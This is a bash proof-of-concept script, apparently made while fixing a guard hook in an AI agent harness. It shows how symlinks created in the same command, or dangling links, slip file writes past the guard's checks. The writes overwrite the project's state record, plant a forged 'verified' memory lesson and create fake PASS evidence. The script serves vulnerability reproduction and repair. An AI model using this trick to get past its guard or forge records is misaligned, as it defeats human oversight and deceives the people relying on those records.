#!/usr/bin/env bash
# Live proof: a symlink into the record created in the same command line, and a dangling link whose
# target is a not-yet-existing record file, let the guard's write checks pass while bash writes the
# real record. Run against 3fa6298. Writes only under the scratch dir.
set -u
WT=${1:-/tmp/claude-0/-home-user-ECCode/f72396f5-b89f-576d-a680-29d481cd71c9/scratchpad/guardfix}
R=${2:-/tmp/claude-0/-home-user-ECCode/f72396f5-b89f-576d-a680-29d481cd71c9/scratchpad/repro3}
GUARD="$WT/scripts/hooks/guard.js"; CLI="$WT/bin/eccode.js"
guard() { # guard <agent|""> <command>
  local p out
  p=$(node -e 'const [cwd,agent,cmd]=process.argv.slice(1);const o={cwd,tool_name:"Bash",tool_input:{command:cmd}};if(agent)o.agent_type=agent;process.stdout.write(JSON.stringify(o))' "$R" "$1" "$2")
  out=$(printf '%s' "$p" | env CLAUDE_PROJECT_DIR= ECCODE_ACTOR= ECCODE_SEQUENTIAL_ROLES= ECCODE_HOOKS= node "$GUARD")
  if [ -z "$out" ]; then echo "GUARD: allow"; else printf 'GUARD: '; printf '%s' "$out" | node -e 'let s="";process.stdin.on("data",c=>s+=c).on("end",()=>{const o=JSON.parse(s).hookSpecificOutput;console.log(o.permissionDecision+": "+o.permissionDecisionReason.slice(0,90))})'; fi
}

echo "=== TOCTOU: alias to the record made in the same command, then written (main session) ==="
rm -rf "$R"; mkdir -p "$R"; cd "$R" || exit 1; git init -q >/dev/null; node "$CLI" init --name x --idea y --root "$R" >/dev/null
BEFORE=$(wc -c < .eccode/state.json)
CMD='ln -s "$PWD/.eccode" lk && echo FORGED > lk/state.json'
guard "" "$CMD"
bash -c "$CMD"
AFTER=$(wc -c < .eccode/state.json)
echo "state.json first line now: $(head -1 .eccode/state.json)"
echo "size $BEFORE -> $AFTER ; HEAD of real record clobbered: $([ "$(head -1 .eccode/state.json)" = FORGED ] && echo YES || echo no)"

echo
echo "=== dangling link whose target is a new memory/evidence file (forged lesson, main session) ==="
rm -rf "$R"; mkdir -p "$R"; cd "$R" || exit 1; git init -q >/dev/null; node "$CLI" init --name x --idea y --root "$R" >/dev/null
mkdir -p .eccode/memory
CMD2='ln -s "$PWD/.eccode/memory/forged.json" dl && echo "{\"status\":\"verified\"}" > dl'
guard "" "$CMD2"
bash -c "$CMD2"
echo "forged lesson written into the record: $([ -f .eccode/memory/forged.json ] && echo YES, contents: "$(cat .eccode/memory/forged.json)" || echo no)"

echo
echo "=== a role within its claim, same trick, onto evidence (forged evidence a handoff could cite) ==="
CMD3='ln -s "$PWD/.eccode/evidence/forged.log" src/dl && echo PASS > src/dl'
guard "eccode:backend-engineer" "$CMD3"
echo "(guard decision above; bash would create .eccode/evidence/forged.log through src/dl)"

echo
echo "=== for contrast: the same alias when it ALREADY exists on disk is denied ==="
rm -rf "$R"; mkdir -p "$R"; cd "$R" || exit 1; git init -q >/dev/null; node "$CLI" init --name x --idea y --root "$R" >/dev/null
ln -s "$PWD/.eccode" lk
guard "" 'echo FORGED > lk/state.json'
